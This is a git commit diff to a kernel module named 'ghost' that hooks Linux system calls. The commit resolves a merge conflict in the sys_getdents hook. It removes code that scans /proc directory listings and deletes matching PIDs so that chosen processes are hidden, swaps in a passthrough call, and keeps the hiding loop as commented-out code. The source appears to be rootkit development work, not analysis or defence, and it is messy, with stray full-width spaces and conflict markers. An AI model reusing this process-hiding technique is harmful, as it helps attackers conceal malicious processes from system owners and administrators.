9e8d69fb05e0ce0d175610d993f081d26a1e39bf
teargear2 <teargear2@gmail.com>
2019-12-21 22:39:18 +0800

    hope

--- program/ghost/ghostmodule.c
+++ program/ghost/ghostmodule.c
@@ -286,41 +286,13 @@ static long khook_sys_kill(pid_t pid, int sig) {
 }
 
 
-<<<<<<< HEAD
 KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user *, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
-	long value=0;
-　　struct inode *dinode;
-　　int len = 0;
-　　int tlen = 0;
-　　struct linux_dirent64 *mydir = NULL;
-　　//end
-　　//在这里调用一下sys_getdents,得到返回的结果
-　　value = (*orig_getdents) (fd, dirp, count);
-　　tlen = value;
-　　//遍历得到的目录列表
-　　while(tlen > 0)
-　　{
-　　len = dirp->d_reclen;
-　　tlen = tlen - len;
-　　printk("%s\n",dirp->d_name);
-　　//在proc文件系统中，目录名就是pid,我们再根据pid找到进程名
-　　if(get_process(myatoi(dirp->d_name)) )
-　　{
-　　printk("find process\n");
-　　//发现匹配的进程，调用memmove将这条进程覆盖掉
-　　memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
-　　value = value - len;
-　　}
-　　if(tlen)
-　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
-　　}
-　　return value;
-=======
-/*KHOOK(sys_getdents);
-static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
-	long value=0;*/
-// 　　struct inode *dinode;
+	int ret;
+	ret = KHOOK_ORIGIN(fd, dirp, count);
+	return ret;
+// 	long value=0;
+// 　	struct inode *dinode;
 // 　　int len = 0;
 // 　　int tlen = 0;
 // 　　struct linux_dirent64 *mydir = NULL;
@@ -345,17 +317,7 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 // 　　if(tlen)
 // 　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
 // 　　}
-//　　return value;
-//}
-
-KHOOK_EXT(long, sys_getdents, struct linux_dirent __user *, unsigned int);
-static long khook_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
-{
-	int ret = 0;
-
-	ret = KHOOK_ORIGIN(fd, dirp, count);
-	return ret;
->>>>>>> 23cc7b493ca1909fa14ed2eae7452811414c7977
+// 　　return value;
 }
 
 
